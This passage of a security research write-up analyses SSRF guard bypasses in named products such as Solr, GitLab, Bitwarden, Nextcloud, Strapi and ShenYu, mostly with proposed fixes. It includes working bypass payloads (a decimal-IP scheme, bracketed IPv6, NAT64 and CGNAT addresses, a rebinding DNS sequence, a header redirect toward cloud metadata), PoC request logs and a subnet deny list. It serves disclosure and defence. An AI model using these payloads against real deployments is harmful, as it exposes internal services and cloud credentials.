+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="java"><code><span class="line"><span style="color:#FF7B72">public</span><span style="color:#FF7B72"> static</span><span style="color:#FF7B72"> final</span><span style="color:#E6EDF3"> Pattern</span><span style="color:#E6EDF3"> URL_PREFIX</span><span style="color:#FF7B72"> =</span><span style="color:#E6EDF3"> Pattern.</span><span style="color:#D2A8FF">compile</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">"^([a-z]*?://).*"</span><span style="color:#E6EDF3">);</span></span></code></pre>
+<p><code>HttpShardHandlerFactory.java</code></p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="java"><code><span class="line"><span style="color:#FF7B72">private</span><span style="color:#E6EDF3"> String </span><span style="color:#D2A8FF">buildUrl</span><span style="color:#E6EDF3">(String url) {</span></span>
+<span class="line"><span style="color:#FF7B72">  if</span><span style="color:#E6EDF3"> (</span><span style="color:#FF7B72">!</span><span style="color:#E6EDF3">URLUtil.</span><span style="color:#D2A8FF">hasScheme</span><span style="color:#E6EDF3">(url)) {                       </span><span style="color:#8B949E">// URL_PREFIX, lowercase-only</span></span>
+<span class="line"><span style="color:#FF7B72">    return</span><span style="color:#E6EDF3"> (StrUtils.</span><span style="color:#D2A8FF">isNullOrEmpty</span><span style="color:#E6EDF3">(scheme) </span><span style="color:#FF7B72">?</span><span style="color:#E6EDF3"> DEFAULT_SCHEME </span><span style="color:#FF7B72">:</span><span style="color:#E6EDF3"> scheme) </span><span style="color:#FF7B72">+</span><span style="color:#A5D6FF"> "://"</span><span style="color:#FF7B72"> +</span><span style="color:#E6EDF3"> url;</span></span>
+<span class="line"><span style="color:#E6EDF3">  }</span></span>
+<span class="line"><span style="color:#E6EDF3">  ...</span></span>
+<span class="line"><span style="color:#E6EDF3">}</span></span></code></pre>
+<p><code>URL_PREFIX</code> is <code>[a-z]*?</code>, lowercase only. <code>2130706433://...</code> does not match,
+so <code>hasScheme</code> returns false, so <code>buildUrl</code> prepends <code>http://</code> and produces
+<code>http://2130706433://realnode:8983/solr/test</code>. RFC 2396 permits the <code>port</code>
+production to contain zero digits, so the authority <code>2130706433:</code> parses as
+<code>host=2130706433</code>, and the JVM resolver reads a bare decimal as IPv4:
+<code>2130706433</code> is <code>127.0.0.1</code>. The guard saw <code>realnode:8983</code>; the fetcher
+dials loopback.</p>
+<p>On Solr’s own loopback netns, negative controls confirmed that the plain
+spellings <code>127.0.0.1</code> and <code>localhost</code> were rejected 403. The bypass payload
+landed its real request:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="http"><code><span class="line"><span style="color:#E6EDF3">>>>>> SSRF HIT (HTTP/2) from ('127.0.0.1', 47874)</span></span>
+<span class="line"><span style="color:#E6EDF3">   :method: POST</span></span>
+<span class="line"><span style="color:#E6EDF3">   :authority: 2130706433:80</span></span>
+<span class="line"><span style="color:#E6EDF3">   :scheme: http</span></span>
+<span class="line"><span style="color:#E6EDF3">   :path: //172.22.0.2:8983/solr/test/select</span></span>
+<span class="line"><span style="color:#E6EDF3">   user-agent: Solr[</span><span style="color:#FFA198;font-style:italic">org.apache.solr.client.solrj.impl.Http</span><span style="color:#79C0FF">2</span><span style="color:#FFA198;font-style:italic">SolrClient</span><span style="color:#E6EDF3">] </span><span style="color:#79C0FF">9.9</span><span style="color:#E6EDF3">.</span><span style="color:#79C0FF">0</span></span></code></pre>
+<p><code>Http2SolrClient</code> opened an h2c connection to <code>127.0.0.1:80</code> and sent
+<code>:authority: 2130706433:80</code>. <code>0://</code> reaches <code>0.0.0.0</code>; <code>2852039166://</code> is
+<code>169.254.169.254</code>; <code>LOCALHOST://</code> is loopback by name. The bound is real and
+stated: the dialed host is a single <code>\w+</code> token (no dots, no hyphens), and
+the port is forced to the scheme default. A 215-token fuzz produced 100 host
+substitutions and zero port wins. The response returns only through
+Solr’s error channel, so this is connection-level and semi-blind, not an
+arbitrary-request primitive. The guard, though, is fully bypassed:
+<code>Http2SolrClient.createHttpClient</code> sets <code>setFollowRedirects(false)</code>
+(<code>Http2SolrClient.java:304</code>), Jetty 10 ignores <code>Alt-Svc</code> and has no ORIGIN
+frame, so the scheme-regex split is the entire reach. Nothing downstream
+extends it.</p>
+<p>This is <code>P</code> evidence at HTTP-request depth through Solr’s shipped <code>shards</code>
+path. Response content is limited to Solr’s error handling.</p>
+<p>The two parsers are not from separate libraries. They are in two Solr files,
+<code>AllowListUrlChecker</code> and <code>URLUtil</code>, doing the same job without sharing a
+scheme grammar. One treats the token as a scheme. The other treats it as a
+hostname. The mismatch is the Solr bug.</p>
+<p>The fix is one shared scheme definition both <code>parseHostPort</code> and <code>buildUrl</code>
+consume, or validation of the exact fetch URL rather than the raw token.</p>
+<h3 id="f4-brackets-make-the-check-disappear">F4, brackets make the check disappear</h3>
+<p>tuwunel’s preview guard feeds one parser’s host serialization into another
+IP parser:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#FF7B72">if</span><span style="color:#E6EDF3"> let Ok(ip) </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> IPAddress::parse(</span></span>
+<span class="line"><span style="color:#E6EDF3">    url.host_str().expect(</span><span style="color:#A5D6FF">"URL previously validated"</span><span style="color:#E6EDF3">))</span></span>
+<span class="line"><span style="color:#FFA198;font-style:italic">    &#x26;&#x26;</span><span style="color:#FFA198;font-style:italic"> !</span><span style="color:#79C0FF">self</span><span style="color:#E6EDF3">.services.client.valid_cidr_range(</span><span style="color:#FF7B72">&#x26;</span><span style="color:#E6EDF3">ip)</span></span>
+<span class="line"><span style="color:#E6EDF3">{</span></span>
+<span class="line"><span style="color:#FF7B72">    return</span><span style="color:#E6EDF3"> Err!(Request(Forbidden(</span></span>
+<span class="line"><span style="color:#A5D6FF">        "Requesting from this address is forbidden"</span><span style="color:#E6EDF3">)));</span></span>
+<span class="line"><span style="color:#E6EDF3">}</span></span></code></pre>
+<p>The WHATWG <code>url</code> crate [11] returns bracketed IPv6 text such as <code>[::1]</code>.
+<code>ipaddress::IPAddress::parse</code> rejects the brackets. <code>if let Ok</code> turns that
+error into “skip the check.” Hostnames skip it too. The later client uses
+ordinary DNS with no validating resolver.</p>
+<p>On the shipped tuwunel v1.7.0 path, private IPv6 literals produced
+connection errors rather than the guard’s <code>M_FORBIDDEN</code>, proving the
+pre-check was skipped and the dial attempted. A remote-address check runs
+after <code>send()</code>; it can discard the response, not unsend the request.
+Proof: <code>P</code>, dial depth, configured preview feature, authenticated Matrix
+user.</p>
+<p>A separate <code>og:image</code> subfetch has no IP check and did store a private
+response as downloadable MXC media. That is a response-body SSRF, but it is
+not F4 and does not upgrade the bracketed-IPv6 proof.</p>
+<h2 id="resolve-stage-three-different-failures">Resolve stage: three different failures</h2>
+<p>The resolver boundary contains three bugs that look alike from a packet
+capture and require different fixes:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>family   what the guard loses</span></span>
+<span class="line"><span>-----------------------------------------------------------------</span></span>
+<span class="line"><span>F2       part of the address set: A is checked, AAAA is dialed</span></span>
+<span class="line"><span>F11      time: a checked address is discarded and DNS runs again</span></span>
+<span class="line"><span>F12      policy: the checked address itself is misclassified</span></span></code></pre>
+<p>F2 needs no race. F11 is the rebinding window. F12 survives perfect
+pinning. Keep those three sentences in mind; they are the whole section.</p>
+<h3 id="f2-half-the-address-set">F2, half the address set</h3>
+<p><code>getaddrinfo(AF_UNSPEC)</code> can return both families. <code>gethostbyname</code> cannot.
+A guard that asks the second question and a client that asks the first do
+not validate the same candidate set.</p>
+<p>The opening Mealie trace is the clean product proof. On the shipped v3.18.0
+image, <code>safehttp</code> calls <code>socket.gethostbyname</code>, approves the public A, and
+returns the unchanged hostname to a curl-backed transport. With one static
+name mapped to <code>A 8.8.8.8</code> and <code>AAAA fd00::beef</code>, libcurl selected the ULA
+and the scrape API returned the listener’s HTML. The ULA was assigned to
+loopback in the lab; the endpoint was
+<code>POST /api/recipes/test-scrape-url</code>. No domain, TTL trick, or rebinding was
+involved.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>validator candidates = { 8.8.8.8 }</span></span>
+<span class="line"><span>fetcher candidates   = { 8.8.8.8, fd00::beef }</span></span>
+<span class="line"><span>connected address    = fd00::beef</span></span></code></pre>
+<p>Proof: <code>P</code>, response-body depth, ordinary authenticated account, configured
+dual-stack reach. The guard was added after CVE-2024-31991 and
+CVE-2024-31993 [27]; the bug is in the replacement guard, not the old
+absence.</p>
+<p>Firefly III has the same component shape:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>// app/Rules/Webhook/IsValidWebhookUrl.php:23</span></span>
+<span class="line"><span>$resolved = gethostbyname(parse_url($value, PHP_URL_HOST));</span></span></code></pre>
+<p>The fetcher is Guzzle’s curl handler. In the matching PHP/curl environment,
+a static public A plus <code>AAAA ::1</code> passed the copied shipping rule and
+returned the loopback listener’s body through cURL. The full Laravel webhook
+transaction was not run, and the recorded configuration also admitted a
+direct RFC 1918 target. Proof: <code>L</code>, response-body depth. It confirms the
+resolver split, but Mealie is the guarded product finding.</p>
+<p>This subtype can arise when a guard uses PHP <code>gethostbyname</code>, Python
+<code>socket.gethostbyname</code>, Node <code>resolve4</code>, Go <code>ip4</code> resolution, or BEAM
+<code>:inet.getaddr</code> before a dual-stack client, then fails to bind the checked
+address to the dial. Craft CMS [25] is published prior art. The test is not
+“did I resolve first?” It is “can the socket use an address I did not check?”</p>
+<h3 id="f11-the-pin-that-gitlab-throws-away">F11, the pin that GitLab throws away</h3>
+<p>GitLab’s URL blocker was written to close the time axis. It resolves,
+classifies, and returns a structured result whose <code>hostname</code> is the IP the
+caller must dial:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#8B949E"># lib/gitlab/http_v2/url_blocker.rb:16</span></span>
+<span class="line"><span style="color:#8B949E"># Result stores the validation result:</span></span>
+<span class="line"><span style="color:#8B949E"># uri - The original URI requested</span></span>
+<span class="line"><span style="color:#8B949E"># hostname - The hostname that should be used to connect. For DNS</span></span>
+<span class="line"><span style="color:#8B949E">#   rebinding protection, this will be the resolved IP address.</span></span></code></pre>
+<p>The main <code>Gitlab::HTTP</code> path consumes that result, sets a hostname override,
+and preserves the original name for SNI. The Octokit path does not.
+<code>Gitlab::Octokit::UrlValidation</code> is installed in Faraday process-wide:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#8B949E"># lib/gitlab/octokit/url_validation.rb</span></span>
+<span class="line"><span style="color:#FF7B72">def</span><span style="color:#D2A8FF"> call</span><span style="color:#E6EDF3">(env)</span></span>
+<span class="line"><span style="color:#E6EDF3">  Gitlab::</span><span style="color:#79C0FF">HTTP_V2</span><span style="color:#E6EDF3">::UrlBlocker.validate!(env[:url],</span></span>
+<span class="line"><span style="color:#E6EDF3">    schemes: </span><span style="color:#FF7B72">%</span><span style="color:#E6EDF3">w[http https],</span></span>
+<span class="line"><span style="color:#E6EDF3">    allow_localhost: allow_local_requests</span><span style="color:#FFA198;font-style:italic">?</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#E6EDF3">    allow_local_network: allow_local_requests</span><span style="color:#FFA198;font-style:italic">?</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#E6EDF3">    dns_rebind_protection: dns_rebind_protection</span><span style="color:#FFA198;font-style:italic">?</span><span style="color:#E6EDF3">,</span></span>
+<span class="line"><span style="color:#79C0FF">    ...</span></span>
+<span class="line"><span style="color:#E6EDF3">  )</span></span>
+<span class="line"><span style="color:#D2A8FF">  @app.call</span><span style="color:#E6EDF3">(env)</span></span>
+<span class="line"><span style="color:#E6EDF3">end</span></span></code></pre>
+<p>The return value disappears. <code>env[:url]</code> still contains the hostname, and
+Faraday’s <code>net_http</code> adapter resolves it again at <code>TCPSocket.open</code>. A
+deterministic DNS server made the lost binding visible on the unmodified
+<code>gitlab/gitlab-ce:18.11.3-ce.0</code> image:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>A#1 rebind.test -> 203.0.113.10   validate_context: passes</span></span>
+<span class="line"><span>A#2 rebind.test -> 203.0.113.10   middleware validate!: passes</span></span>
+<span class="line"><span>A#3 rebind.test -> 172.30.0.3     TCPSocket.open: internal</span></span></code></pre>
+<p>The real <code>POST /api/v4/import/github</code> transaction then put this on the
+private listener:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="http"><code><span class="line"><span style="color:#FF7B72">GET</span><span style="color:#E6EDF3"> /api/v3/repositories/12345 </span><span style="color:#FF7B72">HTTP</span><span style="color:#E6EDF3">/</span><span style="color:#79C0FF">1.1</span></span>
+<span class="line"><span style="color:#7EE787">Accept</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> application/vnd.github.v3+json</span></span>
+<span class="line"><span style="color:#7EE787">User-Agent</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> Octokit Ruby Gem 9.2.0</span></span>
+<span class="line"><span style="color:#7EE787">Authorization</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> token ghp_fake_attacker_token</span></span>
+<span class="line"><span style="color:#7EE787">Host</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> rebind.test</span></span></code></pre>
+<p>Both checks made the correct decision about the public answer. The caller
+discarded the object that carried that decision. Default
+<code>dns_rebinding_protection_enabled = true</code> makes GitLab compute the pin; it
+cannot make Octokit use it.</p>
+<p>Any authenticated user allowed to import into their own namespace can reach
+the path. The request carries the attacker’s PAT and uses a fixed GitHub API
+path. Compatible JSON can be read; arbitrary services degrade to a
+connection/error/timing oracle and fixed-path GET actions. A separate
+component test reached IMDS in 3 of 60 attempts, but the product importer
+cannot choose that metadata path and no IMDS body claim is made.</p>
+<p>Proof: <code>P</code>, HTTP-request depth. The fix is not another DNS check. Make the
+return type impossible to ignore and dial <code>result.hostname</code>. Go
+<code>DialContext</code>, .NET <code>ConnectCallback</code>, and equivalent hooks exist for the
+same reason; public sibling fixes include Prefect, FastGPT [15], and AutoGPT
+[16].</p>
+<h3 id="f12-when-public-is-the-wrong-policy-answer">F12, when “public” is the wrong policy answer</h3>
+<p>A complete resolver and a perfect pin still fail if the classifier omits a
+reachable destination. Two subtypes matter:</p>
+<ul>
+<li>a direct range is absent: CGNAT <code>100.64.0.0/10</code>, bare <code>0.0.0.0</code>, or a sibling RFC 1918 subnet;</li>
+<li>IPv6 is accepted even though this deployment translates it to an embedded private IPv4 destination.</li>
+</ul>
+<p>The second sentence needs discipline. NAT64 and SIIT map destinations only
+when the matching prefix, translator, and route exist [8][9]. In 6to4 the
+embedded IPv4 names a border router or site prefix [41]. Teredo carries
+server and client/NAT metadata. Deprecated IPv4-compatible addresses are
+not magic NAT64 aliases [42]. A classifier pass proves a policy gap; an
+access log behind the translator proves delivery. The 2026 advisory cluster
+[19]-[24] and Symfony [33] document the family. The cases below state which
+one they prove.</p>
+<p><strong>NAT64: a correct pin around the wrong classifier.</strong> Bitwarden Icons
+v2026.4.2 is the sharpest example because its transport does almost
+everything right. <code>SsrfProtectionHandler</code> resolves every answer, checks it,
+rewrites <code>RequestUri</code> to the chosen IP literal, and preserves the original
+host separately. DNS rebinding is closed. The IPv6 predicate is not:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>// src/Core/Utilities/IPAddressExtensions.cs:18</span></span>
+<span class="line"><span>if (ip.AddressFamily == AddressFamily.InterNetworkV6)</span></span>
+<span class="line"><span>{</span></span>
+<span class="line"><span>    return ipString.StartsWith("fc") || ipString.StartsWith("fd") ||</span></span>
+<span class="line"><span>           ipString.StartsWith("fe") || ipString.StartsWith("ff");</span></span>
+<span class="line"><span>}</span></span></code></pre>
+<p>That catches ULA, link-local, and multicast. It misses the well-known NAT64
+prefix <code>64:ff9b::/96</code> and operator-selected prefixes outside those textual
+starts.
+On AWS, a route for <code>64:ff9b::/96</code> pointed through a NAT Gateway. The public
+<code>GET /change-password-uri?uri=...</code> endpoint received:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>http://[64:ff9b::a63:1e2a]/</span></span></code></pre>
+<p>The low 32 bits are <code>10.99.30.42</code>. The guard logged no block, the gateway
+translated, and the private listener recorded:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>10.99.10.105 - - "GET /.well-known/... HTTP/1.1" 404</span></span></code></pre>
+<p><code>10.99.10.105</code> was the NAT Gateway’s private address. The body is not
+returned by this endpoint, so the primitive is blind host/port reach, not
+exfiltration. Link-local IMDS did not route through the gateway and IPv6
+IMDS at <code>fd00:ec2::254</code> was caught by <code>fd</code>. Proof: <code>P</code>, HTTP-request depth,
+configured AWS NAT64 route.</p>
+<p>Nextcloud 33.0.3 turns the same class into a read. Its
+<code>IpAddressClassifier</code> asks <code>mlocati/ip-lib 1.22.0</code> to turn IPv6 into IPv4:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>// lib/private/Net/IpAddressClassifier.php</span></span>
+<span class="line"><span>if ($parsedIp instanceof IPv6) {</span></span>
+<span class="line"><span>    $ip = (string)($parsedIp->toIPv4() ?? $parsedIp);</span></span>
+<span class="line"><span>}</span></span></code></pre>
+<p>The helper extracts IPv4 from 6to4 and <code>::ffff:0:0/96</code>, but not NAT64 or
+SIIT. <code>DnsPinMiddleware</code> therefore resolves, approves, and pins the wrong
+policy answer with <code>CURLOPT_RESOLVE</code>. Through a configured TAYGA
+network-specific prefix, an attacker AAAA record mapped to private
+<code>10.144.0.2</code>. The unauthenticated public endpoint returned the internal
+OpenGraph data:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>POST /ocs/v2.php/references/resolvePublic</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>"richObject":{"name":"Directory listing for /", ...},</span></span>
+<span class="line"><span>"accessible":true</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>sentinel: 10.144.0.3 - - "GET / HTTP/1.1" 200</span></span></code></pre>
+<p>The endpoint discards its sharing token and carries an anonymous rate limit
+of 10 requests per 120 seconds. Proof: <code>P</code>, response-body depth, configured
+NAT64. Other accepted transition forms in the report remain classifier
+results; only the NAT64 form has this routed product proof.</p>
+<p>ThingsBoard confirms the same mechanism in Java. With its opt-in
+<code>SSRF_PROTECTION_ENABLED=true</code>, both the initial guard and
+<code>SsrfSafeAddressResolverGroup</code> use <code>isBlockedAddress</code>. That predicate catches
+Java’s local/site-local/link-local values and <code>fc00::/7</code> but misses NAT64.
+A real TAYGA gateway translated <code>2001:db8:64::a83:2</code> to <code>10.131.0.2</code>, whose
+listener recorded <code>GET /r3-attack</code>. The guard defaults off and the full
+ThingsBoard transaction was not run. Proof: <code>L</code>, HTTP-request depth,
+configured NAT64.</p>
+<p>Managed NAT64 makes these more than laboratory address trivia. AWS documents
+the well-known prefix to same-VPC, connected, on-premises, and internet
+routes; GCP Private NAT64 can apply private VPC routes [37][38]. Translating
+the well-known prefix to non-global IPv4 falls outside RFC 6052 §3.1, but it
+is deployed infrastructure. Without that configured route, the same input
+is only a classifier pass.</p>
+<p><strong>CGNAT and ordinary omissions.</strong> The other subtype needs no translator.
+It still needs a route to <code>100.64.0.0/10</code>. All three PoCs below used a custom
+<code>100.64.0.0/24</code> Docker bridge; the application configuration and missing
+range were otherwise default.</p>
+<p>Strapi’s <code>unstable_uploadFromUrls</code> route is not gated by its name. An
+Editor/Author with <code>plugin::upload.assets.create</code> can reach it. The guard is
+exactly the subnets placed in a Node <code>net.BlockList</code>:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>127.0.0.0/8       10.0.0.0/8        172.16.0.0/12</span></span>
+<span class="line"><span>192.168.0.0/16    169.254.0.0/16     ::1/128</span></span>
+<span class="line"><span>fc00::/7           fe80::/10</span></span></code></pre>
+<p>CGNAT and bare <code>0.0.0.0</code> are absent. The import fetched
+<code>http://100.64.0.2/internal-secret-api</code>, stored the answer as a media asset,
+and made the bytes downloadable:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>POST {"urls":["http://100.64.0.2/internal-secret-api"]}</span></span>
+<span class="line"><span>  -> file:complete {url:"/uploads/internal_secret_api_&#x3C;hash>.txt"}</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>GET /uploads/internal_secret_api_&#x3C;hash>.txt</span></span>
+<span class="line"><span>  -> {"internal-only":true,"aws_secret_key":"CGNAT-..."}</span></span></code></pre>
+<p>On Linux, <code>0.0.0.0:1337</code> also reached Strapi’s own listener. The metadata IP
+was correctly blocked. Proof: <code>P</code>, raw response-body depth, authenticated
+panel role.</p>
+<p>Lemmy and Directus widen the same lesson without changing the technique:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>product    guard omission                         returned</span></span>
+<span class="line"><span>-----------------------------------------------------------------------</span></span>
+<span class="line"><span>Lemmy      Rust is_private(): no 100.64/10        parsed OpenGraph</span></span>
+<span class="line"><span>Directus   own interfaces + exact IMDS IP only    status, headers, body</span></span></code></pre>
+<p>Lemmy’s <code>site_metadata</code> endpoint requires any logged-in local user, not an
+admin; the internal title and description returned. Directus Flows requires
+an admin token; its default denylist also misses sibling RFC 1918 hosts, so
+this is a broad policy omission rather than an address-family trick. Both
+are <code>P</code> at response-body depth on the configured CGNAT bridge.</p>
+<p>One syntax-coverage case belongs here too. Nextcloud’s
+<code>RemoteHostValidator</code> computes the TLD after the final dot, so <code>foo.local.</code>
+has an empty TLD; anchored IP regexes likewise reject
+<code>169.254.169.254.</code> as “not an IP.” Docker’s resolver removed the root-label
+dot. HTTP clients were saved by <code>DnsPinMiddleware</code>, but Mail’s IMAP, SMTP,
+and Sieve sockets call <code>stream_socket_client</code> directly. The shipping
+validator plus socket connected to <code>localhost.</code> and private trailing-dot
+names. Resolver behavior is deployment-dependent and no Mail account
+transaction was run. Proof: <code>L</code>, connection depth.</p>
+<p>F12 is the reminder pinning cannot carry: the address on the socket can be
+exactly the address the guard approved and still violate the deployment’s
+policy. A fixed “private IP” list is not enough. The classifier must know
+the direct ranges and translation prefixes this host can actually route.</p>
+<h2 id="one-header-rewrites-the-upstream-f8">One header rewrites the upstream: F8</h2>
+<p>RFC 3986 defines URI syntax and comparison. It does not define the lifecycle
+of an application’s mutable URL object. A setter can change an authority
+without violating URI syntax, but that does not preserve the application’s
+security invariant. If validation covered object A and the fetch uses
+mutated object B, the verdict no longer covers the request.</p>
+<p>Apache ShenYu is the first F8 product finding in this set. The
+authority is selected from operator configuration, an attacker-reachable
+setter overwrites it, and the emit path dials the mutation without enforcing
+the configured upstream policy again.</p>
+<p>ShenYu is an API gateway; its <code>divide</code> plugin is the core HTTP reverse
+proxy. The operator chooses the upstream through selectors, load balancing,
+service discovery, and health checks. The client chooses only
+the route, meaning the path. <code>DividePlugin.doExecute</code> runs the load
+balancer over the route’s configured upstream pool, producing a selected
+<code>Upstream</code>. Then it reads a request header and overwrites it.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>shenyu-plugin-divide/.../DividePlugin.java:104-113</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>  Upstream upstream = LoadbalancerUtils.getForExchange(</span></span>
+<span class="line"><span>      upstreamList, ruleHandle.getLoadBalance(), exchange);</span></span>
+<span class="line"><span>  ...</span></span>
+<span class="line"><span>  List&#x3C;String> specifyDomains =</span></span>
+<span class="line"><span>      exchange.getRequest().getHeaders().get(Constants.SPECIFY_DOMAIN);</span></span>
+<span class="line"><span>  if (CollectionUtils.isNotEmpty(specifyDomains)) {</span></span>
+<span class="line"><span>      upstream.setUrl(specifyDomains.get(0));   // attacker value, no check</span></span>
+<span class="line"><span>  }</span></span>
+<span class="line"><span>  String domain = upstream.buildDomain();</span></span>
+<span class="line"><span>  exchange.getAttributes().put(Constants.HTTP_DOMAIN, domain);</span></span></code></pre>
+<p><code>Constants.SPECIFY_DOMAIN</code> is the literal string <code>specify-domain</code>, and the
+header value is written onto the selected <code>Upstream</code> with no host
+classification, no allowlist, no SSRF guard. <code>buildDomain()</code> then
+concatenates a scheme onto the now-attacker-supplied URL and emits it.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="java"><code><span class="line"><span style="color:#E6EDF3">shenyu</span><span style="color:#FF7B72">-</span><span style="color:#E6EDF3">loadbalancer</span><span style="color:#FF7B72">/</span><span style="color:#E6EDF3">...</span><span style="color:#FF7B72">/</span><span style="color:#E6EDF3">entity</span><span style="color:#FF7B72">/</span><span style="color:#E6EDF3">Upstream.java</span><span style="color:#FF7B72">:</span><span style="color:#79C0FF">471</span><span style="color:#FF7B72">-</span><span style="color:#79C0FF">476</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">  public</span><span style="color:#E6EDF3"> String </span><span style="color:#D2A8FF">buildDomain</span><span style="color:#E6EDF3">() {</span></span>
+<span class="line"><span style="color:#E6EDF3">      String</span><span style="color:#E6EDF3"> protocol</span><span style="color:#FF7B72"> =</span><span style="color:#79C0FF"> this</span><span style="color:#E6EDF3">.</span><span style="color:#D2A8FF">getProtocol</span><span style="color:#E6EDF3">();</span></span>
+<span class="line"><span style="color:#FF7B72">      if</span><span style="color:#E6EDF3"> (StringUtils.</span><span style="color:#D2A8FF">isBlank</span><span style="color:#E6EDF3">(protocol)) { protocol </span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF"> "http://"</span><span style="color:#E6EDF3">; }</span></span>
+<span class="line"><span style="color:#FF7B72">      return</span><span style="color:#E6EDF3"> protocol</span></span>
+<span class="line"><span style="color:#FF7B72">          +</span><span style="color:#E6EDF3"> Optional.</span><span style="color:#D2A8FF">ofNullable</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">this</span><span style="color:#E6EDF3">.</span><span style="color:#D2A8FF">getUrl</span><span style="color:#E6EDF3">()).</span><span style="color:#D2A8FF">map</span><span style="color:#E6EDF3">(String</span><span style="color:#FF7B72">::</span><span style="color:#E6EDF3">trim).</span><span style="color:#D2A8FF">orElse</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">null</span><span style="color:#E6EDF3">);</span></span>
+<span class="line"><span style="color:#E6EDF3">  }</span></span></code></pre>
+<p>The mutated authority flows to the fetcher unchanged. <code>URIPlugin</code> re-parses
+it with <code>UriComponentsBuilder</code> and the WebClient dials it.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>shenyu-plugin-uri/.../URIPlugin.java:38-43</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>  String domain = exchange.getAttribute(Constants.HTTP_DOMAIN);</span></span>
+<span class="line"><span>  final URI uri = RequestUrlUtils.buildRequestUri(exchange, domain);</span></span>
+<span class="line"><span>  exchange.getAttributes().put(Constants.HTTP_URI, uri);</span></span></code></pre>
+<p>ShenYu selects from the configured upstream pool, but it dials the
+<code>specify-domain</code> value. Those are two different authorities. The load
+balancer’s
+choice is overwritten in place by data from
+the request, and nothing between the setter and the socket re-checks it.
+The override is unconditional: no authentication, no enable flag, and no
+allowlist. <code>specify-domain</code> is an undocumented per-request override.</p>
+<p>On an EC2 instance running Amazon Linux 2023, with a default <code>divide</code> route
+fronting a local backend, the control request takes the configured path and
+the same request plus one header takes the fetch to IMDSv1:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#8B949E"># CONTROL  - no header: the gateway proxies its configured backend</span></span>
+<span class="line"><span style="color:#FFA657">$</span><span style="color:#A5D6FF"> curl</span><span style="color:#A5D6FF"> http://</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#A5D6FF">g</span><span style="color:#E6EDF3">w</span><span style="color:#FF7B72">></span><span style="color:#A5D6FF">/latest/meta-data/instance-id</span></span>
+<span class="line"><span style="color:#FFA657">BACKEND-OK</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#8B949E"># ATTACK   - one header redirects the server-side fetch to 169.254.169.254</span></span>
